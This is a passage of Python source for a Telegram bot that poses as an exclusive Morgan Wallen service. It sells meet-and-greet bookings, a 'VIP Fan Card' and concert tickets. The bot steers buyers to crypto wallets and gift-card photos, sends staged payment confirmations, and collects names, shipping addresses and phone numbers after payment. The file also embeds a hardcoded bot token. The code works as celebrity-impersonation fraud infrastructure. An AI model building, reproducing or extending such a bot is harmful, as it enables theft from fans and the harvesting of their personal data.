from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
import sqlite3
from datetime import datetime, timedelta
import os
import threading
import urllib.request
import json
from flask import Flask

# ================= RENDER HEARTBEAT =================
server = Flask(__name__)
@server.route('/')
def health_check(): return "Alive", 200

# ================= SETTINGS =================
TOKEN = "8681446523:AAHs42JckBFG_n-OYsASEbv-6Q4eFUlE5tw"
ADMIN_IDS = [7936558915]

def is_admin(user_id): return user_id in ADMIN_IDS

# ================= BTC PRICE CONVERTER =================
def get_btc_amount(usd_amount):
    try:
        url = "https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        response = urllib.request.urlopen(req)
        data = json.loads(response.read())
        btc_price = float(data['price'])
        return f"{round(usd_amount / btc_price, 6)} BTC"
    except Exception:
        return f"${usd_amount} (BTC equivalent)"

# ================= DATABASE =================
conn = sqlite3.connect("bot.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, blocked INTEGER DEFAULT 0)")
cursor.execute("CREATE TABLE IF NOT EXISTS wallets (coin TEXT PRIMARY KEY, address TEXT, memo TEXT, network TEXT, guide TEXT)")
cursor.execute("CREATE TABLE IF NOT EXISTS settings (id INTEGER PRIMARY KEY, rej_msg TEXT, app_msg TEXT, price_meet INTEGER, price_biz INTEGER)")

# Safe alter table for existing databases to add the new columns
try: cursor.execute("ALTER TABLE wallets ADD COLUMN network TEXT")
except: pass
try: cursor.execute("ALTER TABLE wallets ADD COLUMN guide TEXT")
except: pass

# --- VIP COLUMNS ---
try: cursor.execute("ALTER TABLE settings ADD COLUMN price_vip INTEGER DEFAULT 3500")
except: pass
try: cursor.execute("ALTER TABLE settings ADD COLUMN vip_app_msg TEXT")
except: pass
try: cursor.execute("ALTER TABLE settings ADD COLUMN vip_rej_msg TEXT")
except: pass

# --- TOUR AND TICKETS COLUMNS ---
try: cursor.execute("ALTER TABLE settings ADD COLUMN price_t_normal INTEGER DEFAULT 500")
except: pass
try: cursor.execute("ALTER TABLE settings ADD COLUMN price_t_vip INTEGER DEFAULT 1000")
except: pass
try: cursor.execute("ALTER TABLE settings ADD COLUMN tour_info TEXT")
except: pass
try: cursor.execute("ALTER TABLE settings ADD COLUMN ticket_app_msg TEXT")
except: pass
try: cursor.execute("ALTER TABLE settings ADD COLUMN ticket_rej_msg TEXT")
except: pass
try: cursor.execute("ALTER TABLE settings ADD COLUMN tour_active INTEGER DEFAULT 1")
except: pass

default_app = "🎉 **Payment Confirmed Successfully**\n\n━━━━━━━━━━━━━━━━━━\n👑 **VIP CONFIRMATION NOTICE**\n━━━━━━━━━━━━━━━━━━\n\nDear User,\n\nYour payment has been successfully verified. Your exclusive meeting with **Morgan Wallen** is now officially scheduled.\n\n📅 **Scheduled Date:** {date}\n\n🎫 **VIP Recognition Card:**\nA VIP Fan Card will be issued as your official form of recognition and identification for the meeting. This card will be prepared and shipped to you within the next **2 days**.\n\n📦 **Shipping & Delivery:**\nPersonal details such as your **Full Name, Shipping Address, and Phone Number** must be provided by you once the card is ready for dispatch to ensure a secure delivery.\n\nThank you for your trust. We look forward to delivering a premium experience.\n\n━━━━━━━━━━━━━━━━━━\nStatus: **CONFIRMED ✅**"
default_vip_app = "🎉 **VIP Fan Card Payment Confirmed**\n\nYour payment for the exclusive VIP Fan Card has been successfully verified! ✅\n\nTo proceed with production and shipping, we require a few details.\nName \nAddress \nPhone number"
default_tour = "🎸 **Morgan Wallen - One Night At A Time Tour**\n\nUpcoming Dates:\n📍 April 15 - Indianapolis, IN (Lucas Oil Stadium)\n📍 April 20 - Oxford, MS (Vaught-Hemingway Stadium)\n📍 May 2 - Nashville, TN (Nissan Stadium)\n📍 May 9 - Hershey, PA (Hersheypark Stadium)\n\n*(More dates to be announced...)*"
default_ticket_app = "🎉 **Ticket Payment Confirmed**\n\nCongratulations! Your payment has been successfully verified. You have been granted an official ticket to Morgan Wallen's exclusive concert. Prepare for an unforgettable experience!\n\nYour digital access details and venue instructions will be sent to you shortly. ✅"
default_ticket_rej = "❌ **Ticket Payment Rejected**\n\nWe were unable to verify your payment for the concert ticket. If you believe this is an error, please ensure your transaction was completed correctly and contact support."

cursor.execute("INSERT OR IGNORE INTO settings (id, price_meet, price_biz, app_msg, price_vip, vip_app_msg, vip_rej_msg) VALUES (1, 15000, 20000, ?, 3500, ?, '❌ VIP Card Payment Rejected.')", (default_app, default_vip_app))
conn.commit()

# Ensure defaults for existing rows
cursor.execute("UPDATE settings SET price_vip = 3500 WHERE price_vip IS NULL")
cursor.execute("UPDATE settings SET vip_app_msg = ? WHERE vip_app_msg IS NULL", (default_vip_app,))
cursor.execute("UPDATE settings SET vip_rej_msg = '❌ VIP Card Payment Rejected.' WHERE vip_rej_msg IS NULL")
cursor.execute("UPDATE settings SET price_t_normal = 500 WHERE price_t_normal IS NULL")
cursor.execute("UPDATE settings SET price_t_vip = 1000 WHERE price_t_vip IS NULL")
cursor.execute("UPDATE settings SET tour_info = ? WHERE tour_info IS NULL", (default_tour,))
cursor.execute("UPDATE settings SET ticket_app_msg = ? WHERE ticket_app_msg IS NULL", (default_ticket_app,))
cursor.execute("UPDATE settings SET ticket_rej_msg = ? WHERE ticket_rej_msg IS NULL", (default_ticket_rej,))
cursor.execute("UPDATE settings SET tour_active = 1 WHERE tour_active IS NULL")
conn.commit()

def get_wallet(coin):
    cursor.execute("SELECT address, memo FROM wallets WHERE coin=?", (coin,))
    row = cursor.fetchone()
    return row if row else ("NOT SET", None)

def get_prices():
    cursor.execute("SELECT price_meet, price_biz, price_vip, price_t_normal, price_t_vip FROM settings WHERE id=1")
    res = cursor.fetchone()
    if res:
        return res[0], res[1], (res[2] if res[2] is not None else 3500), (res[3] if res[3] is not None else 500), (res[4] if res[4] is not None else 1000)
    return 15000, 20000, 3500, 500, 1000

def is_blocked(user_id):
    cursor.execute("SELECT blocked FROM users WHERE user_id=?", (user_id,))
    row = cursor.fetchone()
    return row[0] == 1 if row else False

# ================= START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_blocked(user_id): return

    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    conn.commit()

    user = update.effective_user
    username = f"@{user.username}" if user.username else "No Username"
    
    if not is_admin(user_id):
        for admin in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    chat_id=admin,
                    text=f"🔔 **New User Alert!**\n👤 **Name:** {user.first_name}\n🔗 **Username:** {username}\n🆔 **ID:** `{user_id}`",
                    parse_mode="Markdown"
                )
            except: pass

    await send_main_menu(update, context)

async def send_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, is_callback=False):
    user = update.effective_user
    user_id = user.id
    
    cursor.execute("SELECT tour_active FROM settings WHERE id=1")
    row = cursor.fetchone()
    tour_active = True if (row and row[0] == 1) else False
    
    keyboard = [
        [InlineKeyboardButton("🎯 Book Meeting", callback_data="book")],
        [InlineKeyboardButton("🎫 VIP Fan Card", callback_data="vip_card")]
    ]
    
    if tour_active:
        keyboard.append([InlineKeyboardButton("🎸 Tour & Tickets", callback_data="tour_menu")])
        
    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
        
    welcome_text = (
        f"Welcome, {user.first_name}.\n\n"
        "Thank you for your interest in our exclusive services. "
        "Please select an option below to proceed."
    )
    
    if is_callback:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard))

# ================= CALLBACKS =================
async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    if not is_admin(user_id) and is_blocked(user_id): return
    
    await query.answer()
    data = query.data

    if data == "main_menu":
        context.user_data["step"] = None
        await send_main_menu(update, context, is_callback=True)
        return

    if data.startswith("copy_"):
        val = data.replace("copy_", "")
        await query.message.reply_text(f"`{val}`", parse_mode="MarkdownV2")
        return

    # ADMIN PANEL
    if data == "admin_panel" and is_admin(user_id):
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM users WHERE blocked=1")
        blocked_users = cursor.fetchone()[0]
        
        cursor.execute("SELECT tour_active FROM settings WHERE id=1")
        row = cursor.fetchone()
        tour_status = "ON ✅" if (row and row[0] == 1) else "OFF ❌"
        
        kb = [[InlineKeyboardButton("💰 Prices", callback_data="edit_prices"), InlineKeyboardButton("💳 Wallets", callback_data="wallet_menu")],
              [InlineKeyboardButton("💬 DM User", callback_data="dm_user"), InlineKeyboardButton("🚫 Block Manager", callback_data="block_mgmt")],
              [InlineKeyboardButton("✅ Edit Meet Appr", callback_data="set_app_msg"), InlineKeyboardButton("❌ Edit Meet Rej", callback_data="set_rej_msg")],
              [InlineKeyboardButton("🌟 Edit VIP Appr", callback_data="set_vip_app"), InlineKeyboardButton("🌟 Edit VIP Rej", callback_data="set_vip_rej")],
              [InlineKeyboardButton("🎸 Edit Ticket Appr", callback_data="set_ticket_app"), InlineKeyboardButton("🎸 Edit Ticket Rej", callback_data="set_ticket_rej")],
              [InlineKeyboardButton("📅 Edit Tour Info", callback_data="set_tour_info"), InlineKeyboardButton(f"🎫 Toggle Tour: {tour_status}", callback_data="toggle_tour")],
              [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")]]
        
        admin_info = f"📊 **Admin Panel**\n👤 Admin ID: `{user_id}`\n👥 Total Users: `{total_users}`\n🚫 Blocked Users: `{blocked_users}`"
        await query.edit_message_text(admin_info, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "toggle_tour" and is_admin(user_id):
        cursor.execute("SELECT tour_active FROM settings WHERE id=1")
        row = cursor.fetchone()
        current = row[0] if (row and row[0] is not None) else 1
        new_val = 0 if current == 1 else 1
        cursor.execute("UPDATE settings SET tour_active = ? WHERE id = 1", (new_val,))
        conn.commit()
        
        # Refresh admin panel implicitly
        query.data = "admin_panel"
        await buttons(update, context)
        return

    elif data == "block_mgmt" and is_admin(user_id):
        context.user_data["step"] = "input_block_id"
        await query.edit_message_text("🚫 Enter the **User ID** you wish to manage:")

    elif data.startswith("do_block_") and is_admin(user_id):
        target = data.split("_")[2]
        cursor.execute("UPDATE users SET blocked = 1 WHERE user_id = ?", (target,))
        conn.commit()
        await query.edit_message_text(f"🚫 User `{target}` has been **Blocked**.", parse_mode="Markdown")

    elif data.startswith("do_unblock_") and is_admin(user_id):
        target = data.split("_")[2]
        cursor.execute("UPDATE users SET blocked = 0 WHERE user_id = ?", (target,))
        conn.commit()
        await query.edit_message_text(f"✅ User `{target}` has been **Unblocked**.", parse_mode="Markdown")

    elif data == "set_app_msg" and is_admin(user_id):
        context.user_data["step"] = "setting_app_msg"
        await query.edit_message_text("📥 Send new Meeting Approval Message (Use {date} for the timestamp):")
        
    elif data == "set_vip_app" and is_admin(user_id):
        context.user_data["step"] = "setting_vip_app"
        await query.edit_message_text("📥 Send new VIP Fan Card Approval Message:")

    elif data == "set_vip_rej" and is_admin(user_id):
        context.user_data["step"] = "setting_vip_rej"
        await query.edit_message_text("📥 Send new VIP Fan Card Rejection Message:")
        
    elif data == "set_ticket_app" and is_admin(user_id):
        context.user_data["step"] = "setting_ticket_app"
        await query.edit_message_text("📥 Send new Tour Ticket Approval Message:")
        
    elif data == "set_ticket_rej" and is_admin(user_id):
        context.user_data["step"] = "setting_ticket_rej"
        await query.edit_message_text("📥 Send new Tour Ticket Rejection Message:")
        
    elif data == "set_tour_info" and is_admin(user_id):
        context.user_data["step"] = "setting_tour_info"
        await query.edit_message_text("📥 Send the updated Morgan Wallen Tour Schedule text:")

    elif data == "wallet_menu" and is_admin(user_id):
        kb = [[InlineKeyboardButton("BTC", callback_data="manage_BTC"), InlineKeyboardButton("ETH", callback_data="manage_ETH")],
              [InlineKeyboardButton("USDT", callback_data="manage_USDT"), InlineKeyboardButton("Bank", callback_data="manage_Bank")],
              [InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]
        await query.edit_message_text("Select asset to edit:", reply_markup=InlineKeyboardMarkup(kb))

    elif data == "edit_prices" and is_admin(user_id):
        p_meet, p_biz, p_vip, p_tnormal, p_tvip = get_prices()
        kb = [[InlineKeyboardButton(f"Meet & Greet (${p_meet})", callback_data="setp_meet")],
              [InlineKeyboardButton(f"Business (${p_biz})", callback_data="setp_biz")],
              [InlineKeyboardButton(f"VIP Card (${p_vip})", callback_data="setp_vip")],
              [InlineKeyboardButton(f"Normal Ticket (${p_tnormal})", callback_data="setp_tnormal")],
              [InlineKeyboardButton(f"VIP Ticket (${p_tvip})", callback_data="setp_tvip")],
              [InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]
        await query.edit_message_text("Select price to update:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("setp_") and is_admin(user_id):
        context.user_data["step"] = data
        await query.edit_message_text("🔢 Send the new price (Numbers only):")

    elif data == "dm_user" and is_admin(user_id):
        context.user_data["step"] = "dm_id"
        await query.edit_message_text("🆔 Send the **User ID** you want to message:")

    elif data.startswith("reply_") and is_admin(user_id):
        target = data.split("_")[1]
        context.user_data["target_dm"] = target
        context.user_data["step"] = "dm_msg"
        await query.message.reply_text(f"📝 Replying to `{target}`. Send your message:")

    elif data.startswith("manage_") and is_admin(user_id):
        coin = data.split("_")[1]
        addr, memo = get_wallet(coin)
        
        cursor.execute("SELECT network, guide FROM wallets WHERE coin=?", (coin,))
        row = cursor.fetchone()
        net = row[0] if row and len(row) > 0 and row[0] else "Default"
        guide_status = "Custom Set" if row and len(row) > 1 and row[1] else "Default"

        kb = [[InlineKeyboardButton("📝 Set Address", callback_data=f"setaddr_{coin}")],
              [InlineKeyboardButton("📝 Set Memo", callback_data=f"setmemo_{coin}")],
              [InlineKeyboardButton("✅ Edit Network", callback_data=f"setnet_{coin}")],
              [InlineKeyboardButton("✅ Edit Guide", callback_data=f"setguide_{coin}")],
              [InlineKeyboardButton("⬅️ Back", callback_data="wallet_menu")]]
        await query.edit_message_text(f"💎 **{coin}**\nAddr: `{addr}`\nMemo: `{memo}`\nNetwork: `{net}`\nGuide: `{guide_status}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data.startswith("setaddr_") or data.startswith("setmemo_") or data.startswith("setnet_") or data.startswith("setguide_"):
        target_info = data.split("_")
        action = target_info[0]
        if action == "setaddr": field = "address"
        elif action == "setmemo": field = "memo"
        elif action == "setnet": field = "network"
        else: field = "guide"
        
        context.user_data["edit_target"] = (target_info[1], field)
        await query.edit_message_text(f"📥 Send new value for {field} ({target_info[1]}):")

    elif data == "set_rej_msg" and is_admin(user_id):
        context.user_data["step"] = "setting_rej_msg"
        await query.edit_message_text("📥 Send the new Meeting Rejection Message:")

    elif data == "broadcast" and is_admin(user_id):
        context.user_data["step"] = "broadcasting"
        await query.edit_message_text("📢 Send message for ALL users:")

    elif data.startswith("guide_"):
        coin = data.split("_")[1]
        
        cursor.execute("SELECT network, guide FROM wallets WHERE coin=?", (coin,))
        row = cursor.fetchone()
        custom_net = row[0] if row and len(row) > 0 and row[0] else None
        custom_guide = row[1] if row and len(row) > 1 and row[1] else None

        net_info = custom_net if custom_net else {"BTC": "Bitcoin Network", "ETH": "Ethereum (ERC20) Network", "USDT": "Tron (TRC20) Network"}.get(coin, "the correct network")
        
        if custom_guide:
            guide_text = custom_guide.replace("{network}", net_info)
        else:
            guide_text = (
                f"📘 **Official {coin} Payment Guide**\n\n"
                f"To complete your booking, please follow these professional steps to ensure your {coin} transfer is successful:\n\n"
                f"1️⃣ **Access Your Wallet:** Open your preferred Cryptocurrency exchange (Bybit, Binance, Coinbase) or personal wallet (Trust Wallet, Ledger).\n\n"
                f"2️⃣ **Initiate Transfer:** Select **Withdraw** or **Send** and choose **{coin}** from your asset list.\n\n"
                f"3️⃣ **Select Network:** This is a critical step. Ensure you select the **{net_info}**. Sending funds via the wrong network will result in a permanent loss of funds.\n\n"
                f"4️⃣ **Recipient Details:** Copy the Wallet Address provided in your invoice and paste it into the recipient field. If your invoice includes a **Memo/Tag**, you MUST include it.\n\n"
                f"5️⃣ **Finalize:** Enter the exact amount shown on your invoice, review the transaction, and tap **Confirm**.\n\n"
                f"⚠️ **Note:** Transfers typically take 10-30 minutes to reflect on the blockchain. Once you receive a 'Success' notification in your wallet, click the **Confirm Payment** button below."
            )
        await query.message.reply_text(guide_text, parse_mode="Markdown")

    # USER UI - BOOKING
    elif data == "book":
        p_meet, p_biz, _, _, _ = get_prices()
        kb = [[InlineKeyboardButton(f"Meet & Greet (${p_meet})", callback_data="type_meet")], 
              [InlineKeyboardButton(f"Business (${p_biz})", callback_data="type_business")],
              [InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")]]
        await query.edit_message_text("Choose meeting type:", reply_markup=InlineKeyboardMarkup(kb))

    elif data in ["type_meet", "type_business"]:
        context.user_data["meeting_type"] = "Meet & Greet" if data == "type_meet" else "Business"
        context.user_data["step"] = "reason"
        kb = [[InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")]]
        await query.edit_message_text("Send your reason for the meeting:", reply_markup=InlineKeyboardMarkup(kb))
        
    # USER UI - VIP FAN CARD
    elif data == "vip_card":
        _, _, p_vip, _, _ = get_prices()
        context.user_data["meeting_type"] = "VIP Fan Card"
        context.user_data["step"] = None
        
        kb = [[InlineKeyboardButton("💳 Proceed to Payment", callback_data="proceed_payment")],
              [InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")]]
        await query.edit_message_text(f"🎫 **VIP Fan Card**\n\nSecure your exclusive recognition as a verified VIP.\n\n**Price:** ${p_vip}", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    # USER UI - TOUR & TICKETS
    elif data == "tour_menu":
        kb = [[InlineKeyboardButton("🎫 Ticket Options", callback_data="tour_tickets")],
              [InlineKeyboardButton("📅 Updated Morgan Wallen Tour", callback_data="tour_info_show")],
              [InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")]]
        await query.edit_message_text("🎸 **Tour & Tickets**\n\nSelect an option to proceed:", reply_markup=InlineKeyboardMarkup(kb))

    elif data == "tour_info_show":
        cursor.execute("SELECT tour_info FROM settings WHERE id=1")
        row = cursor.fetchone()
        info_text = row[0] if row and row[0] else default_tour
        kb = [[InlineKeyboardButton("⬅️ Back", callback_data="tour_menu")]]
        await query.edit_message_text(info_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "tour_tickets":
        _, _, _, p_tnormal, p_tvip = get_prices()
        kb = [[InlineKeyboardButton(f"Normal Ticket (${p_tnormal})", callback_data="type_t_normal")],
              [InlineKeyboardButton(f"VIP Ticket (${p_tvip})", callback_data="type_t_vip")],
              [InlineKeyboardButton("⬅️ Back", callback_data="tour_menu")]]
        await query.edit_message_text("Select your ticket type:", reply_markup=InlineKeyboardMarkup(kb))

    elif data in ["type_t_normal", "type_t_vip"]:
        # Directly render the payment menu here so no callbacks are skipped or ignored
        context.user_data["meeting_type"] = "Normal Ticket" if data == "type_t_normal" else "VIP Ticket"
        context.user_data["step"] = None
        
        kb = [[InlineKeyboardButton("BTC", callback_data="pay_BTC"), InlineKeyboardButton("ETH", callback_data="pay_ETH")], 
              [InlineKeyboardButton("USDT", callback_data="pay_USDT"), InlineKeyboardButton("Bank", callback_data="pay_Bank")],
              [InlineKeyboardButton("🎁 Gift Card", callback_data="pay_GiftCard")],
              [InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")]]
              
        payment_text = (
            "💳 **Choose payment method:**\n\n"
            "*(⚠️ Note: To ensure seamless and expedited payment confirmation, cryptocurrency wallet transactions are highly recommended as the system can occasionally experience delays with standard alternative methods.)*"
        )
        await query.edit_message_text(payment_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    # PAYMENT SECTION 
    elif data == "proceed_payment":
        kb = [[InlineKeyboardButton("BTC", callback_data="pay_BTC"), InlineKeyboardButton("ETH", callback_data="pay_ETH")], 
              [InlineKeyboardButton("USDT", callback_data="pay_USDT"), InlineKeyboardButton("Bank", callback_data="pay_Bank")],
              [InlineKeyboardButton("🎁 Gift Card", callback_data="pay_GiftCard")],
              [InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")]]
              
        payment_text = (
            "💳 **Choose payment method:**\n\n"
            "*(⚠️ Note: To ensure seamless and expedited payment confirmation, cryptocurrency wallet transactions are highly recommended as the system can occasionally experience delays with standard alternative methods.)*"
        )
        await query.edit_message_text(payment_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "pay_GiftCard":
        context.user_data["step"] = "waiting_gift_card"
        m_type = context.user_data.get("meeting_type", "Meet & Greet")
        
        back_btn = "tour_menu" if "Ticket" in m_type else "main_menu"
        kb = [[InlineKeyboardButton("⬅️ Back", callback_data=back_btn)]]
        await query.edit_message_text("🎁 **Gift Card Payment**\n\nPlease send/upload a clear, highly visible photo of your Gift Card now. You can send multiple cards if necessary.", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data.startswith("pay_"):
        coin = data.split("_")[1]
        reason = context.user_data.get("reason_text", "No reason provided")
        m_type = context.user_data.get("meeting_type", "Meet & Greet")
        
        if not is_admin(user_id):
            for admin in ADMIN_IDS:
                try: 
                    await context.bot.send_message(chat_id=admin, text=f"💳 **Activity Alert**\nUser: `{user_id}`\nAction: Viewing {coin} payment option\nType: {m_type}", parse_mode="Markdown")
                except: pass

        p_meet, p_biz, p_vip, p_tnormal, p_tvip = get_prices()
        if m_type == "Meet & Greet": price = p_meet
        elif m_type == "Business": price = p_biz
        elif m_type == "VIP Fan Card": price = p_vip
        elif m_type == "Normal Ticket": price = p_tnormal
        else: price = p_tvip
        
        addr, memo = get_wallet(coin)

        if coin == "Bank" and addr == "NOT SET":
            await query.message.reply_text("Unavailable due to network issues.")
            return

        display_price = get_btc_amount(price) if coin == "BTC" else f"${price}"
        kb = [[InlineKeyboardButton("📋 Copy Address", callback_data=f"copy_{addr}")]]
        if memo: kb.append([InlineKeyboardButton("📋 Copy Memo", callback_data=f"copy_{memo}")])
        if coin != "Bank": kb.append([InlineKeyboardButton("📘 Payment Guide", callback_data=f"guide_{coin}")])
        kb.append([InlineKeyboardButton("✅ Confirm Payment", callback_data="confirm_payment")])
        kb.append([InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")])
        
        await query.message.reply_text(f"🧾 **Invoice**\nType: {m_type}\nAmount: {display_price}\nCoin: {coin}\n\n📍 **Addr:** `{addr}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "confirm_payment":
        reason = context.user_data.get("reason_text", "N/A")
        m_type = context.user_data.get("meeting_type", "Meet & Greet")
        t_code = "V" if m_type == "VIP Fan Card" else ("T" if "Ticket" in m_type else "M")
        
        for admin in ADMIN_IDS:
            kb = [[InlineKeyboardButton("✅ Approve", callback_data=f"app_{user_id}_{t_code}"),
                   InlineKeyboardButton("❌ Reject", callback_data=f"rej_{user_id}_{t_code}")]]
            await context.bot.send_message(chat_id=admin, text=f"🧾 **Payment Alert**\nUser: `{user_id}`\nType: {m_type}\nReason: {reason}", reply_markup=InlineKeyboardMarkup(kb))
        await query.edit_message_text("⏳ Awaiting admin approval...")

    elif data.startswith("app_") and is_admin(user_id):
        parts = data.split("_")
        target = int(parts[1])
        t_code = parts[2] if len(parts) > 2 else "M"
        
        if t_code == "V":
            cursor.execute("SELECT vip_app_msg FROM settings WHERE id=1")
            row = cursor.fetchone()
            msg = row[0] if row and row[0] else default_vip_app
            await context.bot.send_message(chat_id=target, text=msg, parse_mode="Markdown")
            
            # Start User Details Prompt Chain
            context.application.user_data.setdefault(target, {})["step"] = "vip_ask_name"
            await query.edit_message_text(f"✅ VIP Approved for {target}. User is currently being prompted for their details.")
            
        elif t_code == "T":
            cursor.execute("SELECT ticket_app_msg FROM settings WHERE id=1")
            row = cursor.fetchone()
            msg = row[0] if row and row[0] else default_ticket_app
            await context.bot.send_message(chat_id=target, text=msg, parse_mode="Markdown")
            await query.edit_message_text(f"✅ Ticket Approved for {target}")

        else:
            cursor.execute("SELECT app_msg FROM settings WHERE id=1")
            row = cursor.fetchone()
            date = (datetime.now() + timedelta(days=5)).strftime('%Y-%m-%d %H:%M')
            msg = row[0].replace("{date}", date) if row else "Confirmed."
            await context.bot.send_message(chat_id=target, text=msg, parse_mode="Markdown")
            await query.edit_message_text(f"✅ Approved for {target}")

    elif data.startswith("rej_") and is_admin(user_id):
        parts = data.split("_")
        target = int(parts[1])
        t_code = parts[2] if len(parts) > 2 else "M"
        
        if t_code == "V":
            cursor.execute("SELECT vip_rej_msg FROM settings WHERE id=1")
            row = cursor.fetchone()
            txt = row[0] if row and row[0] else "❌ VIP Payment Rejected."
        elif t_code == "T":
            cursor.execute("SELECT ticket_rej_msg FROM settings WHERE id=1")
            row = cursor.fetchone()
            txt = row[0] if row and row[0] else "❌ Ticket Payment Rejected."
        else:
            cursor.execute("SELECT rej_msg FROM settings WHERE id=1")
            row = cursor.fetchone()
            txt = row[0] if row and row[0] else "❌ Rejected."
            
        await context.bot.send_message(chat_id=target, text=txt, parse_mode="Markdown")
        await query.edit_message_text(f"❌ Rejected for {target}")


# ================= TEXT HANDLER =================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id) and is_blocked(user_id): return
    text = update.message.text
    step = context.user_data.get("step")

    if is_admin(user_id):
        if context.user_data.get("edit_target"):
            coin, field = context.user_data.pop("edit_target")
            if field == "address": 
                cursor.execute("INSERT INTO wallets (coin, address) VALUES (?, ?) ON CONFLICT(coin) DO UPDATE SET address=excluded.address", (coin, text))
            elif field == "memo": 
                cursor.execute("UPDATE wallets SET memo = ? WHERE coin = ?", (text, coin))
            elif field == "network":
                cursor.execute("UPDATE wallets SET network = ? WHERE coin = ?", (text, coin))
            elif field == "guide":
                cursor.execute("UPDATE wallets SET guide = ? WHERE coin = ?", (text, coin))
            
            conn.commit()
            await update.message.reply_text(f"✅ {coin} updated!")
        
        elif step == "input_block_id":
            context.user_data["step"] = None
            kb = [[InlineKeyboardButton("🚫 Block", callback_data=f"do_block_{text}"), 
                   InlineKeyboardButton("✅ Unblock", callback_data=f"do_unblock_{text}")]]
            await update.message.reply_text(f"Choose action for User `{text}`:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

        elif step == "setting_app_msg":
            cursor.execute("UPDATE settings SET app_msg = ? WHERE id = 1", (text,))
            conn.commit(); context.user_data["step"] = None
            await update.message.reply_text("✅ Meeting Approval Message updated!")
            
        elif step == "setting_vip_app":
            cursor.execute("UPDATE settings SET vip_app_msg = ? WHERE id = 1", (text,))
            conn.commit(); context.user_data["step"] = None
            await update.message.reply_text("✅ VIP Fan Card Approval Message updated!")
            
        elif step == "setting_vip_rej":
            cursor.execute("UPDATE settings SET vip_rej_msg = ? WHERE id = 1", (text,))
            conn.commit(); context.user_data["step"] = None
            await update.message.reply_text("✅ VIP Fan Card Rejection Message updated!")

        elif step == "setting_ticket_app":
            cursor.execute("UPDATE settings SET ticket_app_msg = ? WHERE id = 1", (text,))
            conn.commit(); context.user_data["step"] = None
            await update.message.reply_text("✅ Tour Ticket Approval Message updated!")

        elif step == "setting_ticket_rej":
            cursor.execute("UPDATE settings SET ticket_rej_msg = ? WHERE id = 1", (text,))
            conn.commit(); context.user_data["step"] = None
            await update.message.reply_text("✅ Tour Ticket Rejection Message updated!")

        elif step == "setting_tour_info":
            cursor.execute("UPDATE settings SET tour_info = ? WHERE id = 1", (text,))
            conn.commit(); context.user_data["step"] = None
            await update.message.reply_text("✅ Tour Info updated!")

        elif step and step.startswith("setp_"):
            if "meet" in step: field = "price_meet"
            elif "biz" in step: field = "price_biz"
            elif "tnormal" in step: field = "price_t_normal"
            elif "tvip" in step: field = "price_t_vip"
            else: field = "price_vip"
            
            cursor.execute(f"UPDATE settings SET {field} = ? WHERE id = 1", (int(text),))
            conn.commit(); context.user_data["step"] = None
            await update.message.reply_text("✅ Price updated!")

        elif step == "dm_id":
            context.user_data["target_dm"] = text
            context.user_data["step"] = "dm_msg"
            await update.message.reply_text(f"📝 Message for `{text}`:")

        elif step == "dm_msg":
            target = context.user_data.pop("target_dm")
            context.user_data["step"] = None
            try:
                await context.bot.send_message(chat_id=target, text=text, parse_mode="Markdown")
                await update.message.reply_text("✅ Sent!")
            except: await update.message.reply_text("❌ Failed.")

        elif step == "setting_rej_msg":
            cursor.execute("UPDATE settings SET rej_msg = ? WHERE id = 1", (text,))
            conn.commit(); context.user_data["step"] = None
            await update.message.reply_text("✅ Meeting Rejection Message saved!")

        elif step == "broadcasting":
            cursor.execute("SELECT user_id FROM users WHERE blocked=0")
            for (u,) in cursor.fetchall():
                try: await context.bot.send_message(chat_id=u, text=text)
                except: pass
            context.user_data["step"] = None
            await update.message.reply_text("📢 Broadcast sent!")

    # User Post-Approval VIP Steps
    if step == "vip_ask_name":
        context.user_data["vip_name"] = text
        context.user_data["step"] = "vip_ask_address"
        await update.message.reply_text("📦 Excellent. Now, please reply with your **Full Shipping Address**:", parse_mode="Markdown")
        
    elif step == "vip_ask_address":
        context.user_data["vip_address"] = text
        context.user_data["step"] = "vip_ask_phone"
        await update.message.reply_text("📱 Great. Now, please provide your **Phone Number**:", parse_mode="Markdown")

    elif step == "vip_ask_phone":
